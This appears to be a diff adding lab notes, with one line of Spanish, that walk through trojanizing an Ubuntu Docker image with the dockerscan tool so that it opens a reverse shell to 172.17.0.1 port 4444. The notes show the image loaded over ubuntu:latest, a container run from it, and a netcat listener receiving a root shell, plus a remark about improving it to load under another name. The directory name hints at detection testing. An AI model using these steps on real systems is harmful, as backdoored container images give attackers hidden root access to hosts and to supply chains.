@@ -1,0 +1,54 @@
+
+    docker run -it --net=host --name wajadockerscan -h dockerscan waja/dockerscan /bin/sh
+
+    mkdir backdoor
+
+    /backdoor # dockerscan image modify trojanize ubuntu-original -l 172.17.0.1 -p 4444 -o ubuntu-original-trojanized
+    [ * ] Starting analyzing docker image...
+    [ * ] Selected image: 'ubuntu-original'
+    [ * ] Image troyanized successful
+    [ * ] Trojanized image location:
+    [ * ]   > /backdoor/ubuntu-original-trojanized.tar
+    [ * ] To receive the reverse shell, only write:
+    [ * ]   > nc -v -k -l 172.17.0.1 4444
+    /backdoor # ls
+    ubuntu-original                 ubuntu-original-trojanized.tar
+    /backdoor # ls -lha ubuntu-original-trojanized.tar 
+    -rw-r--r--    1 root     root      160.5M Nov 19 03:58 ubuntu-original-trojanized.tar
+
+
+
+    root@pho3nix:/home/diegoall/FALCO# docker cp ubuntu-original wajadockerscan:/backdoor
+    Successfully copied 80.6MB to wajadockerscan:/backdoor
+    root@pho3nix:/home/diegoall/FALCO# docker cp wajadockerscan:/backdoor .
+
+
+    root@pho3nix:/home/diegoall/FALCO/backdoor# docker load -i ubuntu-original-trojanized.tar
+    c2cf0cc09269: Loading layer [==================================================>]  84.16MB/84.16MB
+    The image ubuntu:latest already exists, renaming the old one with ID sha256:fec8bfd95b54439b934c5033dc62d79b946291c327814f2d4df181e1d7536806 to empty string
+    Loaded image: ubuntu:latest
+
+
+Mejorar pa que la imagen cargue con otro nombre.
+
+
+    ubuntu                                    <none>            fec8bfd95b54   4 weeks ago     78.1MB
+
+
+
+    root@pho3nix:/home/diegoall/FALCO/backdoor# docker run -it ubuntu:latest /bin/bash
+    root@490bb7cadc01:/#
+
+
+
+
+    root@pho3nix:/home/diegoall/FALCO/dockerscan# nc -v -k -l 172.17.0.1 4444
+    Listening on pho3nix 4444
+    Connection received on 172.17.0.2 58238
+    connecting people
+    id
+    uid=0(root) gid=0(root) groups=0(root)
+    whoami
+    root
+    hostname -I
+    172.17.0.2
